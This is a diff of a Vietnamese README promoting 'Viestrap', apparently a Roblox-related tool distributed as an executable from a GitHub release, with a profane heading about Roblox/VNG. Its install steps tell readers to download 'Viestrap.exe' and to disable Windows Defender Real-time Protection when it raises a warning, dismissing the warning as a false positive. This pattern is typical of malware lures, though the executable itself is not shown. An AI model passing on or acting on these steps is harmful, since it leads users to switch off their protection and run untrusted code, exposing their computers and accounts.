@@ -4,10 +4,10 @@
 
   <!-- ĐOẠN ĐẦU TRANG HIỂN THỊ LINK THÔ THEO YÊU CẦU -->
   <h1>📥 DOWNLOAD VIESTRAP NEWEST HERE 📥</h1>
-  [https://github.com](https://github.com/jgokok123-cyber/Viestrap/releases/tag/v1.0.0)
+(https://github.com/jgokok123-cyber/Viestrap/releases/tag/v1.0.0)
 
   <!-- THÔNG ĐIỆP IN HOA NỔI BẬT NHẤT -->
-  <h2>🔥 FUCK RBLX VNG 🔥</h2>
+  <h2> FUCK RBLX VNG </h2>
 
   <a href="https://github.com">
     <img src="https://shields.io" alt="Latest Release">
@@ -37,7 +37,7 @@
 ### 📥 HƯỚNG DẪN TẢI VÀ CÀI ĐẶT CHI TIẾT
 *   **Bước 1:** Coppy đường link ở đầu bài giới thiệu này và dán vào trình duyệt để vào trang tải.
 *   **Bước 2:** Cuộn xuống mục *Assets*, bấm vào tên file **`Viestrap.exe`** để tải tệp tin về máy tính.
-*   **Bước 3:** Tạm thời **Tắt tính năng Real-time Protection** (Bảo vệ thời gian thực) của Windows Defender nếu hệ thống hiện cảnh báo hoặc báo lỗi False Positive (Nhận diện nhầm mã độc).
+*   **Bước 3:** Tạm thời **Tắt tính năng Real-time Protection** (Bảo vệ thời gian thực) của Windows Defender nếu hệ thống hiện cảnh báo hoặc báo lỗi False Positive (Nhận diện sai).
 *   **Bước 4:** Mở ứng dụng lên và **Enjoy** trải nghiệm game không giới hạn!
 
 ---
